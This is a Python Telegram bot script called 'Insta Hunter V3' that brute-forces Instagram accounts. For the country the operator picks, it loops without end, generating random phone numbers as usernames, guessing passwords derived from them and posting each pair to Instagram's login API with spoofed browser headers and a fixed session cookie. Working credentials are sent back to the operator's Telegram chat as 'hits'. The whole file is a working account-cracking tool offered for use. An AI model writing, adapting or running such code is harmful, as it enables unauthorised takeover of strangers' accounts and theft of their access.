import webbrowser  
import requests
import random
import telebot
import os
from telebot import types
from uuid import uuid4
import webbrowser
webbrowser.open('https://t.me/horo4')
ToKen = input("Token : ")
print("تم تشغيل الاداه اذهب الى بوتك لبدء الصيد ")
bot = telebot.TeleBot(ToKen)
@bot.message_handler(commands = ["start"])
def Start(message):
 Name = message.chat.first_name
 User = message.from_user.username 
 ID = message.chat.id
 A = types.InlineKeyboardMarkup(row_width=2)
 B = types.InlineKeyboardButton(text ="Dev Acc ✅" , url = "t.me/hydra404x")
 C = types.InlineKeyboardButton(text ="Contact with Dev ✅" , url = "t.me/hydra404_bot")
 D =  types.InlineKeyboardButton(text = "✅ START HUNT",callback_data="y")
 A.add(B,C,D)
 bot.reply_to(message, """  
⌯ Welcome king ({})       
⌯ In Insta Hunter V3 Beta
⌯ To start Cracking click on START
⌯ Your Username : [@{}]          
⌯ Your ID : [{}]
""".format(Name,User,ID) , parse_mode = "markdown" , reply_markup = A)	
@bot.callback_query_handler(func=lambda call: True)
def answer(call):
    if call.data =="y":
        button(call.message)
    if call.data =="Iran":
        Iran(call.message)
    if call.data =="Iraq":
         Iraq(call.message)
    if call.data =="Tr":
         TR(call.message)  
    if call.data =="EG":
    	EGYPT(call.message)
    if call.data == "Ku":
    	Kuwait(call.message)
    if call.data == "SA":
    	SAUDIA(call.message)
    if call.data == "Mo":
    	Morocco(call.message)
P  = types.InlineKeyboardButton(text = "🇮🇷 IRAN : إيران", callback_data= 'Iran')
P1 = types.InlineKeyboardButton(text = "🇮🇶 IRAQ : العراق", callback_data = 'Iraq')
P2 = types.InlineKeyboardButton(text = "🇩🇿 ALGERIA : الجزائر", callback_data = 'Tr')
P3 = types.InlineKeyboardButton(text = "🇪🇬 EGYPT :  مصر", callback_data = 'EG')
P4 = types.InlineKeyboardButton(text = "🇹🇳 TUNISIA : تونس", callback_data = 'Ku')
P5 = types.InlineKeyboardButton(text = "🇦🇪 UAE : الإمارات", callback_data = 'SA')
P6 = types.InlineKeyboardButton(text = "🇲🇦 MOROCCO : المغرب",callback_data = 'Mo')
def button(message):
    O0 = types.InlineKeyboardMarkup(row_width=1)
    O0.add(P6,P,P1,P2,P3,P4,P5)
    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="**Choose**",parse_mode='markdown',reply_markup=O0)          
def Iran(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+98918' + us
		password = '0918' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f"""{username}:{password}""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad : {B} ",callback_data='Alosh')
		A2 = types.InlineKeyboardButton(f"✅ Good : {H}",callback_data='Alosh1')
		A3 = types.InlineKeyboardButton(f"🔐 Secured : {S}",callback_data='Alosh2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='Alosh3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Welcome to Insta Hunter V3 *",parse_mode = "markdown",reply_markup=o) 
		
def Iraq(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+964771' + us
		password = '0771' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f"""{username}:{password}""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad : {B} ",callback_data='Alosh')
		A2 = types.InlineKeyboardButton(f"✅ Good : {H}",callback_data='Alosh1')
		A3 = types.InlineKeyboardButton(f"🔐 Secured : {S}",callback_data='Alosh2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='Alosh3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Welcome to Insta Hunter V3 *",parse_mode = "markdown",reply_markup=o) 
def TR(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username =  '+21377' + us
		password = '077' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f"""{username}:{password}""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad : {B} ",callback_data='Alosh')
		A2 = types.InlineKeyboardButton(f"✅ Good : {H}",callback_data='Alosh1')
		A3 = types.InlineKeyboardButton(f"🔐 Secured : {S}",callback_data='Alosh2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='Alosh3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Welcome to Insta Hunter V3 *",parse_mode = "markdown",reply_markup=o) 
##
#
#
#
#
#


#



def EGYPT(message):
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+20128' + us
		password = '0128' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f"""{username}:{password}""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad : {B} ",callback_data='Alosh')
		A2 = types.InlineKeyboardButton(f"✅ Good : {H}",callback_data='Alosh1')
		A3 = types.InlineKeyboardButton(f"🔐 Secured : {S}",callback_data='Alosh2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='Alosh3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Welcome to Insta Hunter V3 *",parse_mode = "markdown",reply_markup=o) 
##
#
#
#
#
#


#



def Kuwait(message):
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+2162' + us
		password = '2' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f"""{username}:{password}""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad : {B} ",callback_data='Alosh')
		A2 = types.InlineKeyboardButton(f"✅ Good : {H}",callback_data='Alosh1')
		A3 = types.InlineKeyboardButton(f"🔐 Secured : {S}",callback_data='Alosh2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='Alosh3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Welcome to Insta Hunter V3 *",parse_mode = "markdown",reply_markup=o)
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
def SAUDIA(message):
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321') 
		us = str(''.join((random.choice(user) for i in range(7))))
		username = '+97152' + us
		password = '052' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f"""{username}:{password}""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad : {B} ",callback_data='Alosh')
		A2 = types.InlineKeyboardButton(f"✅ Good : {H}",callback_data='Alosh1')
		A3 = types.InlineKeyboardButton(f"🔐 Secured : {S}",callback_data='Alosh2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='Alosh3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Welcome to Insta Hunter V3 *",parse_mode = "markdown",reply_markup=o) 
#
#

#
#
#
#
#
#
#
#
#
#
#
def Morocco(message):	
	S = 0
	B = 0
	H = 0
	while True:
		url = 'https://www.instagram.com/api/v1/accounts/login/'
		headers = {
'accept': '*/*',
'access-control-allow-credentials': 'true',
'access-control-allow-origin': 'https://www.instagram.com',
'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '352',
'content-type': 'application/x-www-form-urlencoded',
'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/accounts/login/',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Linux"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
'x-asbd-id':'198387',
'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
'x-ig-app-id':'936619743392459',
'x-requested-with':'XMLHttpRequest',
'Host':'i.instagram.com'}
		user = ('0987654321')
		us = str(''.join((random.choice(user) for i in range(8))))
		username = '+2126' + us
		password = '06' + us
		uid = str(uuid4())
		data = {'uuid':uid,  'password':password, 
     'username':username, 
     'device_id':uid, 
     'from_reg':'false', 
     '_csrftoken':'missing', 
     'login_attempt_countn':'0'}
		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
		if 'logged_in_user' in req_login.text:
			H+=1
			Hit = (f"""{username}:{password}""")
			bot.send_message(message.chat.id, text=Hit)
		elif '"message":"challenge_required","challenge"' in req_login.text:
			S+=1
		else:
			B+=1
		o = types.InlineKeyboardMarkup(row_width=1)
		A1 = types.InlineKeyboardButton(f"❌ Bad : {B} ",callback_data='Alosh')
		A2 = types.InlineKeyboardButton(f"✅ Good : {H}",callback_data='Alosh1')
		A3 = types.InlineKeyboardButton(f"🔐 Secured : {S}",callback_data='Alosh2')
		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='Alosh3')
		o.add(A1,A2,A3,A4)
		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Welcome to Insta Hunter V3 *",parse_mode = "markdown",reply_markup=o) 
bot.polling(True)
